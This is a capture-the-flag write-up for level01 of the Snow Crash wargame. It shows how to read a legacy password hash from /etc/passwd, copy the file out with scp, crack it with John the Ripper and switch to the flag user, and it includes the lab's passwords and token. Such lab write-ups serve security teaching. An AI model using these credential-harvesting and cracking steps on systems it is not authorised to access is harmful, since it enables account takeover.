Login as `level01`.
```shell
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level01
level01@192.168.1.64's password: x24ti5gi3x0ol2eh4esiuxias
```
There is no file or binary to exploit in home directory, nor file owned by `flag01`.
```shell
level01@SnowCrash:~$ ls -l
total 0
```
By looking `/etc/passwd` reveals encrypted password.
```shell
level01@SnowCrash:~$ cat /etc/passwd
[...]
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
[...]
```
As `/etc/passwd` is readable it can be copied.
```shell
level01@SnowCrash:~$ ls -l /etc/passwd
-rw-r--r-- 1 root root 2477 Mar  5  2016 /etc/passwd
```
Copy `/etc/passwd` file from VM on local to further transfer on Kali.
```shell
┌──$ [~/42/2021/snow-crash]
└─>  scp -P 4242 level01@192.168.1.64:/etc/passwd .
level01@192.168.1.64's password: x24ti5gi3x0ol2eh4esiuxias
passwd                       100% 2477     4.9MB/s   00:00
```

Copy `passwd` file into Kali Linux to further processing.
```shell
┌──$ [~/42/2021/snow-crash]
└─>  scp -P 2222 passwd kali@localhost:/tmp
kali@localhost's password: kali
passwd                       100% 2477     2.8MB/s   00:00
```

Use **JTR**[¹](https://en.wikipedia.org/wiki/John_the_Ripper) to crack the `/tmp/passwd` file.
```shell
┌──$ [~/42/2021/snow-crash]
└─>  ssh kali@localhost -p 2222 /usr/sbin/john --show /tmp/passwd
kali@localhost's password:
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash
1 password hash cracked, 0 left
```
Another way to crack the password without copying the file.
```shell
kali@kali:~$ john --show <(echo 42hDRfypTqqnw)
?:abcdefg
```

Login as `flag01` and get the flag.
```shell
level01@SnowCrash:~$ su flag01
Password: abcdefg
Don't forget to launch getflag !
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
```
